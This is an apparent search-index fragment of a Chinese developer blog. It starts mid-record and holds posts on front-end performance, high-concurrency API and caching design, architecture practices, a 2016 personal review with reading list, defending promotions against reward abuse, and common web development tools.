","date":"2017-07-05","objectID":"/posts/2017-07-05-fore-end-optimize/:2:4","tags":["前端"],"title":"大话WEB前端性能优化基本套路","uri":"/posts/2017-07-05-fore-end-optimize/"},{"categories":["前端"],"content":"拓展资料 移动 H5 前端性能优化指南 Web 性能优化：图片优化 WebP 探寻之路 浅谈浏览器 http 的缓存机制 常见的前端性能优化手段都有哪些？都有多大收益？ 前端性能优化相关 ","date":"2017-07-05","objectID":"/posts/2017-07-05-fore-end-optimize/:2:5","tags":["前端"],"title":"大话WEB前端性能优化基本套路","uri":"/posts/2017-07-05-fore-end-optimize/"},{"categories":["前端"],"content":"性能辅助工具 智图-Webp 谷歌 PageSpeed Insights(网页载入速度检测工具，需要翻墙) 入门 Webpack，看这篇就够了 前端构建工具 gulpjs 的使用介绍及技巧 Gulp 入门指南 看完上面的套路介绍 可能有人会说：我在前端界混了这么多年，这些我都知道，只不过我不想去做 我答： 知道做不到，等于不知道 也可能有人会说：压缩合并等这些操作好繁琐，因为懒，所以不做 我答： 现在前端构建工具都很强大，如:grunt、gulp、webpack，支持各种插件操作，还不知道就说明你 OUT 了 因为我主要负责后端相关工作，前端并不是我擅长的，但是平时也喜欢关注前端前沿技术，这里以我的视角和开发经验梳理出基本套路， 套路点到为止，具体实施可以通过拓展资料进行深入了解，如有疑义或者补充请留言怼。 ","date":"2017-07-05","objectID":"/posts/2017-07-05-fore-end-optimize/:2:6","tags":["前端"],"title":"大话WEB前端性能优化基本套路","uri":"/posts/2017-07-05-fore-end-optimize/"},{"categories":["高并发"],"content":"高并发业务除了需要有支撑高并发的服务器架构，还需要根据业务需求和架构体系，设计出合理的开发方案， 这里根据一个实践过业务场景分析开发思路，罗列出高并发接口需要注意的点，以及设计上的巧思，共勉之，望共鸣 ","date":"2017-05-21","objectID":"/posts/2017-05-21-api-design/:0:0","tags":["高并发"],"title":"高并发业务接口开发思路(实战)","uri":"/posts/2017-05-21-api-design/"},{"categories":["高并发"],"content":"业务场景 业务： 今日好货 交互端： IOS/Andorid 需求点：（实际业务会复杂些，为了容易理解，这里简化需求点） 提供最新的好货商品信息列表，支持分页 需要时时获取最新的商品数据列表，以下情况商品信息会发生变化 商品数据字段更新(人为编辑，热度字段更新，等) 商品不定时上新，在固定时段会有大量商品更新(目前 10 点/20 点上新量大) 商品在会在规律时间里重新排序(根据：销量，曝光量，点击量 等计算排序) 商品加载过程中不能出现重复商品 客户端和服务端需要考虑加载商品的交互体验 终极目标： 支持高并发下业务稳定 ","date":"2017-05-21","objectID":"/posts/2017-05-21-api-design/:1:0","tags":["高并发"],"title":"高并发业务接口开发思路(实战)","uri":"/posts/2017-05-21-api-design/"},{"categories":["高并发"],"content":"设计思路 前提： 【商品服务API】：通过商品服务提供的 API 获取商品数据，当商品有上新、字段更新、排序有更新时，通过 API 都可以获取到最新的数据(db 查询，支持获取未来时间里的商品数据) 缓存使用 Redis 缓存更新分析： 商品数据缓存到 Redis：支撑高并发的查询业务，数据需要进行缓存 提供商品缓存刷新接口：商品显示需要即时性，需要时时展示最新数据，当商品发生变化的时候，我们需要刷新商品缓存数据 支持未来时间缓存提前更新：为了更好支撑即时性，尤其在固定时段商品的大量上新，缓存更新会比较慢，所以我们需要提前备好未来时间的缓存数据 缓存刷新需要注意点：缓存更新的过程中不能出现前台无数据展示的情况 商品缓存支持版本号区分：每次缓存更新都要生成一个新的数据版本号缓存 Key，数据存储在对应的缓存版本 Key 里 缓存版本 Key 存储到列表 ：列表可以用来筛选出当前时间可以使用的最新版本号 商品缓存更新设计： 接口参数：updatetime【更新时间】(可空)，默认等于当前时间，可以传未来时间 每次刷新缓存都会生成新的数据版本号作为【商品缓存Key名】，将数据存到版本号对应的缓存 Key 中，所以需要生成一个唯一字符串，这里我们把【更新时间】的时间戳作为缓存的 Key 名，为何这么设计，后面会介绍到 首先请求【商品服务API】获取【更新时间】对应的商品数据，接着对数据进行字段处理、排序，最后把最终商品数据更新到【商品缓存Key名】的 Redis SortedSet 中 商品缓存成功后，把【商品缓存Key名】存到【版本号集合】Redis SortedSet 中，同时把【更新时间】的时间戳作为排序的值 【商品缓存Key名】=【更新时间】的时间戳，这个设计的目的是可以支持未来时间版本数据的提前更新，并且可以通过 SortedSet 排序，过滤出当前时间最新的版本号 缓存结构图 今日好货 API 设计： 接口参数：version：数据版本号(可空)，pageindex：页码 响应 JSON 数据：Datas：商品数据集合，CurrentVersion：当前数据版本号 【当前最新版本号】：【版本号集合】通过 SortedSet 机制，获取当前时间能够使用的数据版本号， 如：取[当前时间戳]-[(当前时间-1h)时间戳]区间的版本号，排序后获取离当前时间最近的版本号作为最新版本号 \u003c这里为何取区间，而不是直接取最新版本号，会有个容错处理，后面会说到\u003e 用户在浏览商品的时候客户端请求【今日好货API】需要上传版本号和页数，如果是第一次(pageindex=1，首页)，会获取【当前最新版本号】，然后返回最新商品数据 客户端本地缓存首页数据返回的版本号，后续翻页需要客户端上报缓存的版本号，API 返回版本号对应的商品分页数据，这样设计的目的是当用户继续加载后面页数数据的时候不会出现重复的数据(数据会不定时更新，避免用户加载到重复的数据，如：商品 A 原来是第一页数据，数据更新后变成第二页数据) 当请求首页数据，客户端上报的版本号=【当前最新版本号】，就不进行数据缓存查询，直接返回空数据（数据不变），客服端无需重新渲染商品列表，同时可以避免无限下拉刷新带来的服务器压力 如果 version 参数没有上传，获取【当前最新版本号】和当前最新数据返回，数据版本号参数有上传，就获取对应版本号的分页数据 其他注意点： 版本号无限累加 【版本号集合】随着时间增长，版本号数据会不断累加，需要在每次更新的时候删除掉最近一天的版本，操作 SortedSet 过滤掉比(当前时间-1 天)的时间戳小的版本号 容错处理 获取【当前最新版本号】的时候，操作 【版本号集合】集合，获取最近一个小时的，即操作 SortedSet[当前时间戳]至[(当前时间-1h)时间戳]范围内的版本号，然后从大到小排序版本号，过滤出版本号，并且有版本号相对于的商品数据，如果不存在商品数据，就往下遍历，直到有符合规则的版本号返回 双 11 模式： 一级缓存 将商品数据短暂的缓存到站点服务区 Cache 中 降级方案： 资源监控，自动降级 开启降级方案后，客服端会从 cdn 中拉取商品数据 商品分页数据生成 JSON 数据文件存储到 cdn 中 架构图 ","date":"2017-05-21","objectID":"/posts/2017-05-21-api-design/:2:0","tags":["高并发"],"title":"高并发业务接口开发思路(实战)","uri":"/posts/2017-05-21-api-design/"},{"categories":["高并发"],"content":"总结 以上举例的高并发接口设计的实践方案，有些设计可能比较针对此业务场景，但是思路是有共性的，重点在于理解设计上的思路 高并发接口的开发需要考虑因素: 接口性能 接口的稳定 容错机制 服务端压力：竟可能减少服务端压力，可以与客户端交互配合 服务降级：资源高压力的情况下进行降级 ","date":"2017-05-21","objectID":"/posts/2017-05-21-api-design/:3:0","tags":["高并发"],"title":"高并发业务接口开发思路(实战)","uri":"/posts/2017-05-21-api-design/"},{"categories":null,"content":"分层，分割，分布式 大型网站要很好支撑高并发，这是需要长期的规划设计 在初期就需要把系统进行分层，在发展过程中把核心业务进行拆分成模块单元，根据需求进行分布式部署，可以进行独立团队维护开发。 分层 将系统在横向维度上切分成几个部分，每个部门负责一部分相对简单并比较单一的职责，然后通过上层对下层的依赖和调度组成一个完整的系统 比如把电商系统分成：应用层，服务层，数据层。(具体分多少个层次根据自己的业务场景) 应用层：网站首页，用户中心，商品中心，购物车，红包业务，活动中心等，负责具体业务和视图展示 服务层：订单服务，用户管理服务，红包服务，商品服务等，为应用层提供服务支持 数据层：关系数据库，nosql 数据库 等，提供数据存储查询服务 分层架构是逻辑上的，在物理部署上可以部署在同一台物理机器上，但是随着网站业务的发展，必然需要对已经分层的模块分离部署，分别部署在不同的服务器上，使网站可以支撑更多用户访问 分割 在纵向方面对业务进行切分，将一块相对复杂的业务分割成不同的模块单元 包装成高内聚低耦合的模块不仅有助于软件的开发维护，也便于不同模块的分布式部署，提高网站的并发处理能力和功能扩展 比如用户中心可以分割成：账户信息模块，订单模块，充值模块，提现模块，优惠券模块等 分布式 分布式应用和服务,将分层或者分割后的业务分布式部署，独立的应用服务器，数据库，缓存服务器 当业务达到一定用户量的时候，再进行服务器均衡负载，数据库，缓存主从集群 分布式静态资源，比如：静态资源上传 cdn 分布式计算，比如：使用 hadoop 进行大数据的分布式计算 分布式数据和存储,比如：各分布节点根据哈希算法或其他算法分散存储数据 网站分层-图 1 来自网络 ","date":"2017-02-27","objectID":"/posts/2017-02-27-high-concurrency-scheme-xp/:1:0","tags":["高并发"],"title":"大话程序猿眼里的高并发之续篇","uri":"/posts/2017-02-27-high-concurrency-scheme-xp/"},{"categories":null,"content":"集群 对于用户访问集中的业务独立部署服务器，应用服务器，数据库，nosql 数据库。 核心业务基本上需要搭建集群，即多台服务器部署相同的应用构成一个集群，通过负载均衡设备共同对外提供服务， 服务器集群能够为相同的服务提供更多的并发支持，因此当有更多的用户访问时，只需要向集群中加入新的机器即可, 另外可以实现当其中的某台服务器发生故障时，可以通过负载均衡的失效转移机制将请求转移至集群中其他的服务器上，因此可以提高系统的可用性 应用服务器集群 nginx 反向代理 slb … … (关系/nosql)数据库集群 主从分离，从库集群 通过反向代理均衡负载-图 2 来自网络 ","date":"2017-02-27","objectID":"/posts/2017-02-27-high-concurrency-scheme-xp/:2:0","tags":["高并发"],"title":"大话程序猿眼里的高并发之续篇","uri":"/posts/2017-02-27-high-concurrency-scheme-xp/"},{"categories":null,"content":"异步 在高并发业务中如果涉及到数据库操作，主要压力都是在数据库服务器上面，虽然使用主从分离，但是数据库操作都是在主库上操作，单台数据库服务器连接池允许的最大连接数量是有限的 当连接数量达到最大值的时候，其他需要连接数据操作的请求就需要等待有空闲的连接，这样高并发的时候很多请求就会出现connection time out 的情况 那么像这种高并发业务我们要如何设计开发方案可以降低数据库服务器的压力呢？ 如： 自动弹窗签到，双 11 跨 0 点的时候并发请求签到接口 双 11 抢红包活动 双 11 订单入库 等 设计考虑： 逆向思维，压力在数据库，那业务接口就不进行数据库操作不就没压力了 数据持久化是否允许延迟？ 如何让业务接口不直接操作 DB，又可以让数据持久化？ 方案设计： 像这种涉及数据库操作的高并发的业务，就要考虑使用异步了 客户端发起接口请求，服务端快速响应，客户端展示结果给用户，数据库操作通过异步同步 如何实现异步同步？ 使用消息队列，将入库的内容 enqueue 到消息队列中，业务接口快速响应给用户结果(可以温馨提示高峰期延迟到账) 然后再写个独立程序从消息队列 dequeue 数据出来进行入库操作，入库成功后刷新用户相关缓存，如果入库失败记录日志，方便反馈查询和重新持久化 这样一来数据库操作就只有一个程序(多线程)来完成，不会给数据带来压力 补充： 消息队列除了可以用在高并发业务，其他只要有相同需求的业务也是可以使用，如：短信发送中间件等 高并发下异步持久化数据可能会影响用户的体验，可以通过可配置的方式，或者自动化监控资源消耗来切换时时或者使用异步，这样在正常流量的情况下可以使用时时操作数据库来提高用户体验 异步同时也可以指编程上的异步函数，异步线程，在有的时候可以使用异步操作，把不需要等待结果的操作放到异步中，然后继续后面的操作，节省了等待的这部分操作的时间 ","date":"2017-02-27","objectID":"/posts/2017-02-27-high-concurrency-scheme-xp/:3:0","tags":["高并发"],"title":"大话程序猿眼里的高并发之续篇","uri":"/posts/2017-02-27-high-concurrency-scheme-xp/"},{"categories":null,"content":"缓存 高并发业务接口多数都是进行业务数据的查询，如：商品列表，商品信息，用户信息，红包信息等，这些数据都是不会经常变化，并且持久化在数据库中 高并发的情况下直接连接从库做查询操作，多台从库服务器也抗不住这么大量的连接请求数（前面说过，单台数据库服务器允许的最大连接数量是有限的） 那么我们在这种高并发的业务接口要如何设计呢？ 设计考虑： 还是逆向思维，压力在数据库，那么我们就不进行数据库查询 数据不经常变化，我们为啥要一直查询 DB？ 数据不变化客户端为啥要向服务器请求返回一样的数据？ 方案设计： 数据不经常变化，我们可以把数据进行缓存，缓存的方式有很多种，一般的：应用服务器直接 Cache 内存，主流的：存储在 memcache、redis 内存数据库 Cache 是直接存储在应用服务器中，读取速度快，内存数据库服务器允许连接数可以支撑到很大，而且数据存储在内存，读取速度快，再加上主从集群，可以支撑很大的并发查询 根据业务情景，使用配合客户端本地存，如果我们数据内容不经常变化，为啥要一直请求服务器获取相同数据，可以通过匹配数据版本号，如果版本号不一样接口重新查询缓存返回数据和版本号，如果一样则不查询数据直接响应 这样不仅可以提高接口响应速度，也可以节约服务器带宽，虽然有些服务器带宽是按流量计费，但是也不是绝对无限的，在高并发的时候服务器带宽也可能导致请求响应慢的问题 补充： 缓存同时也指静态资源客户端缓存 cdn 缓存，静态资源通过上传 cdn，cdn 节点缓存我们的静态资源，减少服务器压力 redis 的使用技巧参考我的博文[大话 Redis 基础]，[大话 Redis 进阶] ","date":"2017-02-27","objectID":"/posts/2017-02-27-high-concurrency-scheme-xp/:5:0","tags":["高并发"],"title":"大话程序猿眼里的高并发之续篇","uri":"/posts/2017-02-27-high-concurrency-scheme-xp/"},{"categories":null,"content":"面向服务 SOA面向服务架构设计 微服务更细粒度服务化，一系列的独立的服务共同组成系统 使用服务化思维，将核心业务或者通用的业务功能抽离成服务独立部署，对外提供接口的方式提供功能。 最理想化的设计是可以把一个复杂的系统抽离成多个服务，共同组成系统的业务，优点：松耦合，高可用性，高伸缩性，易维护。 通过面向服务化设计，独立服务器部署，均衡负载，数据库集群，可以让服务支撑更高的并发 服务例子： 用户行为跟踪记录统计 说明： 通过上报应用模块，操作事件，事件对象，等数据，记录用户的操作行为 比如：记录用户在某个商品模块，点击了某一件商品，或者浏览了某一件商品 背景： 由于服务需要记录用户的各种操作行为，并且可以重复上报，准备接入服务的业务又是核心业务的用户行为跟踪，所以请求量很大，高峰期会产生大量并发请求。 架构： nodejs WEB 应用服务器均衡负载 redis 主从集群 mysql 主 nodejs+express+ejs+redis+mysql 服务端采用 nodejs,nodejs 是单进程（PM2 根据 cpu 核数开启多个工作进程），采用事件驱动机制，适合 I/O 密集型业务，处理高并发能力强 业务设计： 并发量大，所以不能直接入库，采用：异步同步数据,消息队列 请求接口上报数据，接口将上报数据 push 到 redis 的 list 队列中 nodejs 写入库脚本，循环 pop redis list 数据，将数据存储入库，并进行相关统计 Update，无数据时 sleep 几秒 因为数据量会比较大，上报的数据表按天命名存储 接口： 上报数据接口 统计查询接口 上线跟进： 服务业务基本正常 每天的上报表有上千万的数据 ","date":"2017-02-27","objectID":"/posts/2017-02-27-high-concurrency-scheme-xp/:6:0","tags":["高并发"],"title":"大话程序猿眼里的高并发之续篇","uri":"/posts/2017-02-27-high-concurrency-scheme-xp/"},{"categories":null,"content":"冗余，自动化 当高并发业务所在的服务器出现宕机的时候，需要有备用服务器进行快速的替代，在应用服务器压力大的时候可以快速添加机器到集群中，所以我们就需要有备用机器可以随时待命。 最理想的方式是可以通过自动化监控服务器资源消耗来进行报警，自动切换降级方案，自动的进行服务器替换和添加操作等，通过自动化可以减少人工的操作的成本，而且可以快速操作，避免人为操作上面的失误。 冗余 数据库备份 备用服务器 自动化 自动化监控 自动化报警 自动化降级 通过 GitLab 事件，我们应该反思，做了备份数据并不代表就万无一失了，我们需要保证高可用性，首先备份是否正常进行，备份数据是否可用，需要我们进行定期的检查，或者自动化监控， 还有包括如何避免人为上的操作失误问题。(不过事件中 gitlab 的开放性姿态，积极的处理方式还是值得学习的) ","date":"2017-02-27","objectID":"/posts/2017-02-27-high-concurrency-scheme-xp/:7:0","tags":["高并发"],"title":"大话程序猿眼里的高并发之续篇","uri":"/posts/2017-02-27-high-concurrency-scheme-xp/"},{"categories":null,"content":"总结 高并发架构是一个不断衍变的过程，冰洞三尺非一日之寒，长城筑成非一日之功 打好基础架构方便以后的拓展，这点很重要 这里重新整理了下高并发下的架构思路，举例了几个实践的例子，如果对表述内容有啥意见或者建议欢迎在博客中留言 ","date":"2017-02-27","objectID":"/posts/2017-02-27-high-concurrency-scheme-xp/:8:0","tags":["高并发"],"title":"大话程序猿眼里的高并发之续篇","uri":"/posts/2017-02-27-high-concurrency-scheme-xp/"},{"categories":["总结"],"content":"光阴似箭，岁月如梭，2016即将过去，回首2016我自己个儿都整了些啥玩意儿？ 搭建博客站： 年初我搭建了我自己的博客，托管在Git云平台的pages； 目的是为了归纳总结在工作中实战经验梳理成博文并进行分享； 已经发布博文内容涉及到的有：高并发架构和并发下数据处理，redis使用技巧，web安全，Web开发工具推荐和Web开发必备指南教程等，有挺多人留言分享意见感觉挺好； 同时也是对于语言组织能力的一种锻炼； 今年我磕的书： 《番茄工作法图解》很小的一本书，灵活利用番茄时间可以更好的把控工作时间并且提高工作效率 《大型网站技术架构》这本书讲述了大型网站的架构理念和架构案例剖析，书中提到的架构方法和思维方式都是架构师必备的技巧 在编码方面我最常说的一句话是：“要面向抽象编程，不要面向实现编程” ,这句话的来源是《Head First 设计模式》，灵活的运用设计模式把逻辑抽象出来，只有这样才能达到代码上的易维护易拓展，低耦合 《React Native入门与实战》这本书我磕了一部分，由于精力问题没有继续研究，后续再继续。react native开发原生最好是有原生开发经验，并且熟悉前端技术的开发者来学习 今年前端学习： mvvm框架：reactjs、vuejs 预编译语言：typescript、less 自动化工具：gulp、grunt、webpack 巩固nodejs web开发，了解nodejs 作为中间层来实现前后端分离 学习了解了 react native，weex，以及最近很流行的微信小程序，这些都是未来前端在原生这块可以进军的方向 有些只是亮了技能树，因为本身主要从事的是后端工作，前端这块在工作中实战机会较少，有时可以帮助前端调试下问题； 前端框架包罗万象，工具更新迭代的很快，万花丛中迷人眼，在学习新的框架和工具的时候需要注意怎样运用到项目中解决问题，重点放在问题本身； 学的越多忘的越快，要把学到的运用到实际的开发中来这样才有意义； 总结2016年: 充实的一年，学习和了解了很多架构技巧和前端技术，巩固设计模式 搭建博客站，不定时的总结梳理实战的博文分享 工作空闲时间调研新技术，浏览技术博文 在项目的开发和方案设计重点考虑：支撑高并发，大数据处理，安全等，尽可能做到易维护，易拓展 开发分布式服务：时间短信服务、活动发奖分服务等，nodejs 服务：用户行为跟踪，用户操作日志等 今年也压力最大的一年，有了孩子家庭开销变多，看着厦门房价蹭蹭上涨，架势是要敢超一线城市，鸭梨山大 展望2017年: 期望可以把更多的时间留给家人 期望不再浮躁，可以静下心做事情 继续不断总结实战经验通过博文分享 继续调研前沿技术，温故知新，把只是点亮的技术继续深造，运用到实际的项目中 切记注意锻炼身体，健康是革命的本钱 定一个小目标 ：赚N++多money 计划17过年后换个新的工作环境，目前从事岗位.net高级后端开发，前端技术，nodejs都有涉猎，期望岗位：后端架构师、全栈攻城狮、高级后端开发 期望合作的互联网公司是做自己的互联网产品，大家有厦门公司推荐+微信：DreamYYQ@我，谢绝猎头~ 可以到【关于我】了解我的详情 2016收藏博文推荐： 架构/优化 双 11 高可用架构演进之路 服务降级背后的技术架构设计 58 怎么玩数据库架构 电商那些年，我摸爬打滚出的高并发架构实战精髓 互联网项目架构经验分享 虎嗅网架构演变 京东 618 实践：一元抢宝系统的数据库架构优化 浅谈 Web 架构之演化过程 京东交易架构分享（含 PPT） 高性能服务器架构思路 前后端同构之路 前后端分离，是为了彼此更好 技术周刊 Vol.3 - 前后端分离与前端工程化 移动端开发者眼中的前端开发流程变迁与前后端分离 图解基于 Node.js 实现前后端分离 彻底弄懂 Http 缓存机制：基于缓存策略三要素分解法 Web 缓存核心技术点需知 缓存使用总结 缓存架构设计细节二三事 架构的坑系列：缓存 + 哈希 = 高并发？ 常见性能优化策略的总结 一个经验证可落地的秒杀系统实践思路 大众点评订单系统分库分表实践 400% 的飞跃：Web 页面加载速度优化实战 大促活动前团购系统流量预算和容量评估 一分钟学会服务器压力测试 7 天 600 stars，Mobi.css 是如何诞生的 Mobi.css：轻量、灵活的移动端 CSS library 为什么说 DOM 操作很慢？ 数据库 译 如果有人问你数据库的原理，叫他看这篇文章 唯品会的订单分库分表实践总结以及关键步骤 京东评价系统海量数据存储高可用设计 小程序 从零开始制作一个跑步微信小程序 微信小程序征服指南 微信小程序开发视频教程 微信小程序实时开发工具 WEPT 正式发布 不需内测账号，带你体验微信小程序完整开发过程 全球首个微信 “小程序” 开发教程（每日更新） 前端CSS，JS JavaScript 全栈工程师培训教程 Web 开发必备指南 7 招提升你的前端开发效率 对于《2016 年前端技术观察》的一些看法 割裂的前端工程师：2017 年前端生态窥探 译 我终于弄懂了各种前端 build 工具 译 几款开发 CSS 最好的前端开发工具 公司前端开发架构改造 2016 年前端技术栈展望 京东单品页前端开发那些不得不说的事儿 前端优化实践总结 译 2016 年 50 个最佳的轻量级 JavaScript 框架和库 怎么学 JavaScript？ 《JavaScript 闯关记》 JavaScript 设计模式 2016 年 JavaScript 开发者需要了解的技能 性能卓越的 JS 模板引擎 artTemplate this 的值到底是什么？一次说清楚 React/React Native 译 React 还是 Vue：你该如何选择？ React 入门与进阶（首篇） 超详细 React Native 实现微信好友/朋友圈分享功能 React Native 开发技术周报（第 13 期） React Native 从入门到原理 React Native 开发技术周报（第 9 期） 分享个基于 Node.js + React 的博客系统 React Native 开发技术周报（第 18 期） React Native 实践之携程 Moles 框架 Redux 的基本使用方式 Redux 最佳实践 vuejs 用 vue 从零开始写一个项目 Weex 阿里 Weex 框架 Android 平台初体验 TypeScript TypeScript 初识 NodeJS 译 Facebook 发布了新的 Node 模块管理器 Yarn，或取代 npm 客户端 高质量 Node.js 微服务的编写和部署 10 个最适合 Web 和 App 开发的 NodeJS 框架 WebPack Webpack 从入门到上线 gulp Gulp不完全入门教程 Git 闯过这 54 关，点亮你的 Git 技能树（四） 安全 蝗虫般的刷客大军：手握千万手机号，分秒间薅干一家平台 魂淡别碰的孩子(接口) 译 如何成为一名黑客（2001） HTTPS 到底是个啥玩意儿？ “HTTPS” 安全在哪里？ 工具 超完整的 Chrome 浏览器客户端调试大全 最好用的 Visual Studio Code 特性和插件 基于Git云平台搭建博客 搭建一个免费的，无限流量的Blog—-github Pages和Jekyll入门 知乎：github上利用jekyll搭建自己的blog的操作顺序？ 免费Jekyll博客模板 其他 技术 Leader 的多维度能力及成长路径 唤醒 App 的那些事 什么是工程师文化？ 一家公司要了你后，凭什么开高工资给你？ 从拖延到高效，我推荐这 7 本书 浅谈遗留代码的重构 熟悉的陌生人：HTTP RESTful Web 服务：教程 如何选择创业公司 如何给变量取个简短且无歧义的名字 Android 应用进程启动流程 技术团队的绩效排名方法 ","date":"2016-12-31","objectID":"/posts/2016-12-31-2016-end/:0:0","tags":["2016"],"title":"再见2016，你好2017","uri":"/posts/2016-12-31-2016-end/"},{"categories":["安全"],"content":" content {:toc} 互联网发展至今产品层出不穷迭代迅速，产品在运营推广的过程中需要做活动推广业务对外进行引流、注册 热门的活动在运营的过程中总是会发现某些用户每期都参与并且多次获得奖励，此时对活动的历史数据进行查询分析后后背脊一凉，妈蛋，活动被刷了~ 这里所提到的用户包括(站内用户、手机号、设备码、IP、微信 UnionID) ","date":"2016-12-11","objectID":"/posts/2016-12-11-shuake/:0:0","tags":["防刷","刷客"],"title":"大话今天你被刷了吗？","uri":"/posts/2016-12-11-shuake/"},{"categories":["安全"],"content":"前言 大多数公司的产品设计和程序猿对于推广活动业务的防刷意识不强，在业务设计和开发的过程中没有把防刷的功能加入业务中，给那些喜欢刷活动的人创造了很多的空子 等到你发现自己被刷的时候，已经产生了不小的损失，少则几百几千，多则几万，作为有节操的程序猿，看到自己开发的业务被刷是什么感受？ 我们要拿起武器(代码)进行自我的防御，风控，加高门槛。 随着利益的诱惑，现在已经浮现了一个新的职业“刷客”，专业刷互联网活动为生，刷到的活动商品进行低价转手处理，开辟了一条新的灰色产业链。 ","date":"2016-12-11","objectID":"/posts/2016-12-11-shuake/:0:1","tags":["防刷","刷客"],"title":"大话今天你被刷了吗？","uri":"/posts/2016-12-11-shuake/"},{"categories":["安全"],"content":"危险信号 举一个栗子： 站外活动推广为了引导新用户下载注册，活动参与需要让用户输入手机号，如果输入手机号是新用户就提示获得奖励并引导用户下载 APP，用户进入 APP 输入参与活动的手机号注册并获得奖励，或者活动在微信推广，引导微信授权注册等 在做这块业务开发的时候普遍认为手机号是对应用户的，而且注册时需要输入验证码，手机必须是本人的，这个业务不会被刷，因此没有对用户进行限制，刷客在参与这个活动业务的时候发现了这个缺陷，然后就肆无忌惮刷走奖励。 这里需要注意手机号，微信都已经不能被表示为是一个用户，我们需要通过多个维度进行是否是同一个用户的判钉(设备码，IP，等)，刷客可以自己养 N 张手机卡和 N 个微信，刷完这个活动再刷另一家活动。 赶紧回顾下自己的做过的业务，是不是有这样的危险的问题？ ","date":"2016-12-11","objectID":"/posts/2016-12-11-shuake/:0:2","tags":["防刷","刷客"],"title":"大话今天你被刷了吗？","uri":"/posts/2016-12-11-shuake/"},{"categories":["安全"],"content":"防刷设计 风控 设定业务中关键数据的多个区间(橙色预警，红色预警，报警)，当统计数据越过区间时进行警报通知相关人员，或者自动奖励降级、暂停活动业务。 黑名单 将检测出刷客的用户加入黑名单，所有业务共享这份名单，全面的封杀刷客。 技术防刷 接口参数签名 合法请求验证(useragent,reference，等) 合法操作行为验证(如：微信推广需要先进行微信的授权，如果用户请求参与活动接口上报的微信 UnionId 近期没有授权记录则为非法行为) 业务防刷 产品在设计业务和程序猿进行需求评审的时候需要对业务中可能出现被刷的需求点进行评估，必要时加入防刷的设计，如：限制用户获取奖励次数，等。 ","date":"2016-12-11","objectID":"/posts/2016-12-11-shuake/:0:3","tags":["防刷","刷客"],"title":"大话今天你被刷了吗？","uri":"/posts/2016-12-11-shuake/"},{"categories":["安全"],"content":"未来设想 在与刷客的较量中，今天你战胜了他，他就会放弃刷你，但是他马上就转身去祸害别人，在互联网的大家庭里我们需要合作共赢，可以成立一个第三方的防刷客联盟，共同的维护这份刷客用户的黑名单，让他们无所遁形。 ","date":"2016-12-11","objectID":"/posts/2016-12-11-shuake/:0:4","tags":["防刷","刷客"],"title":"大话今天你被刷了吗？","uri":"/posts/2016-12-11-shuake/"},{"categories":["安全"],"content":"总结 WEB 开发的过程中，出现接口被刷，业务被刷这是经常会发生的事情，问题出现并不可怕，面对问题就等于解决了一半。 分享此篇博文共勉，希望可以提醒大家防火防盗防刷客，提高防刷的意识，防范于未然。 推荐相关博文 蝗虫般的刷客大军：手握千万手机号，分秒间薅干一家平台 大话接口隐私与安全 大话 WEB 安全 ","date":"2016-12-11","objectID":"/posts/2016-12-11-shuake/:0:5","tags":["防刷","刷客"],"title":"大话今天你被刷了吗？","uri":"/posts/2016-12-11-shuake/"},{"categories":["开发工具"],"content":" content {:toc} 开发的过程中经常会使用到的各种辅助软件，学会并灵活的使用这些工具，可以提高开发效率，提高排查问题的速度，达到一个事半功倍的效果； 这里我就列出在开发的过程中我会使用的一些工具，分享给大家。 ","date":"2016-10-18","objectID":"/posts/2016-10-19-sq-shared/:0:0","tags":["开发工具"],"title":"大话WEB开发必备神器","uri":"/posts/2016-10-19-sq-shared/"},{"categories":["开发工具"],"content":"抓包神器 WEB API 开发和调试，线上问题排查，总是需要有抓包工具进行请求的抓包分析 如：手机APP，PC 软件，浏览器和WEB API 交互请求的抓包 常用功能 模拟请求，get，post 等 获取请求报文，响应报文，分析报文 编辑请求报文(请求参数，请求头，cookie 等)，重新发起请求 请求断点，编辑请求头，或者响应内容 等 并发请求测试 请求响应时间分析 … … 以下是我经常会使用到的几个抓包神器,具体的使用看【使用教程】， 我这里就分享下我在使用工具上的心得 Fiddler 使用教程 Fiddler 是我最早开始使用的抓包器，完全免费，把报文的解析成不同的数据模块通过切换可以很清晰的找到自己想要数据， 而且可以很方便的修改请求头数据，上传的参数，cookie，编辑完成后还可以重新发起请求； 优点： 完全免费 支持手机端代理抓包 支持https抓包 http 报文解析成对应的数据模块，结构清晰查找方便 缺点 Fiddler 是基于微软 .Net 技术开发的，没办法直接在 Mac/Linux 下使用 host解析修改后需要重新启动，不然解析无法生效 Charles 使用教程 优点： Fiddler的优点 Charles基本都有 支持Mac/Linux Charles抓包到的请求根据域名分类展示，这点我很喜欢，很方便查看 可以发起并发请求 缺点 收费，免费的有限制 Wireshark 使用教程 这个抓包工具功能比较强大，除了可以抓 http协议还可以抓如：TCP 等 各种协议的请求， 我一般在抓程序发起TCP连接操作Redis，mongodb的时候会使用，看看代码在实际的协议中触发的操作命令是什么。 ","date":"2016-10-18","objectID":"/posts/2016-10-19-sq-shared/:0:1","tags":["开发工具"],"title":"大话WEB开发必备神器","uri":"/posts/2016-10-19-sq-shared/"},{"categories":["开发工具"],"content":"HOST解析工具 SwitchHosts 官方入口 域名host解析必备神器，支持 windows和Mac的开源工具， 使用简单，支持自定义分类配置，可切换配置，合并配置。 ","date":"2016-10-18","objectID":"/posts/2016-10-19-sq-shared/:0:2","tags":["开发工具"],"title":"大话WEB开发必备神器","uri":"/posts/2016-10-19-sq-shared/"},{"categories":["开发工具"],"content":"轻量级文本编辑器 Sublime 轻量级文本编辑器，各种使用技巧，前端开发神器，各种插件欲罢不能，如：Emmet 等 Visual Studio Code 微软开源轻量级文本编辑器后起之秀，据说打开大文本文件速度很快，也是支持各种插件，官方提供中文版， 对于：nodejs，typescript 等开发也都有很好的支持，有一种要取代sublime的“感脚” ","date":"2016-10-18","objectID":"/posts/2016-10-19-sq-shared/:0:3","tags":["开发工具"],"title":"大话WEB开发必备神器","uri":"/posts/2016-10-19-sq-shared/"},{"categories":["开发工具"],"content":"翻墙神器 Lantern Lantern 中文简称“蓝灯”，免费翻墙工具，翻墙后就可以通过google查询开发资料对于开发者来说这个还是很有必要的，同时也是宅男必备神器╮(‵▽′)╭ 此处省略一万字，自行脑补画面 ","date":"2016-10-18","objectID":"/posts/2016-10-19-sq-shared/:0:4","tags":["开发工具"],"title":"大话WEB开发必备神器","uri":"/posts/2016-10-19-sq-shared/"},{"categories":["开发工具"],"content":"浏览器调试工具 打开浏览器F12就会启动调试工具，不同内核浏览器集成不一样的开发者工具 [推荐]谷歌开发者调试工具 可切换手机模式 设置网络状况,2G，3G，4G，wifi 等 请求抓包 